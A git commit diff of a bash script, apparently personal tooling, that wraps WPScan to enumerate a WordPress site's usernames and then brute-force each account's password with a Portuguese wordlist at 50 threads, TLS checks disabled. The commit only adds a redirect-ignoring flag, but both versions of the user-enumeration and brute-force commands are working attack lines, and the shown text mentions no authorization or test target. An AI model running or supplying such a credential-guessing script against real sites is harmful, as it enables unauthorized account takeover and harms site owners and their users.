034c7bc5a8dd10284d9fd2fbf0187cb4c3aaef6e
meepmaster360 <paulomotaborges@gmail.com>
2024-04-09 13:17:48 +0100

    1

--- wpscanmeep.sh
+++ wpscanmeep.sh
@@ -14,7 +14,7 @@ function imput_url() {
 
 function user_enumeration () {
     echo "Performing user enumeration..."
-    wpscan --url https://"$website_url" --enumerate u > user_enum.txt
+    wpscan --url https://"$website_url" --ignore-main-redirect --enumerate u > user_enum.txt
     # Extract usernames from the user enumeration result
     USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
 } 
@@ -25,7 +25,7 @@ function user_enumeration () {
 function force_brute () {
         for USERNAME in $USERLIST; do
         echo "Performing brute force attack for user: $USERNAME..."
-        wpscan --url https://"$website_url" --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
+        wpscan --url https://"$website_url" --ignore-main-redirect --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
     done
 }
 
